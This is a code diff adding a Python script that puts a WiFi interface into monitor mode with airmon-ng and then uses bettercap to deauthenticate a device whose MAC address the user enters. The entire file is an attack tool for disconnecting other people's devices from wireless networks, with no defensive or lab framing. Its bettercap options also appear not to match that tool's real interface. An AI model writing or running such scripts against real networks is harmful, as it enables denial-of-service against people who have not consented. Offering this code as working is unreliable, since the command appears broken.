@@ -1,0 +1,27 @@
+import subprocess
+
+# Function to enable monitor mode using airmon-ng
+def enable_monitor_mode(wifi_interface):
+    command = ["sudo", "airmon-ng", "start", wifi_interface]
+    subprocess.run(command)
+
+# Function to deauthenticate a device using Bettercap
+def deauthenticate_device(device_mac, wifi_interface):
+    command = ["sudo", "bettercap", "--interface", wifi_interface, "--deauth", "--target", device_mac]
+    subprocess.run(command)
+
+# Main function
+def main():
+    # Input device MAC address and WiFi interface
+    device_mac = input("Enter the MAC address of the device to deauthenticate: ")
+    wifi_interface = input("Enter the WiFi interface (e.g., wlan0): ")
+
+    # Enable monitor mode
+    enable_monitor_mode(wifi_interface)
+
+    # Deauthenticate device
+    deauthenticate_device(device_mac, wifi_interface)
+
+# Execute main function
+if __name__ == "__main__":
+    main()
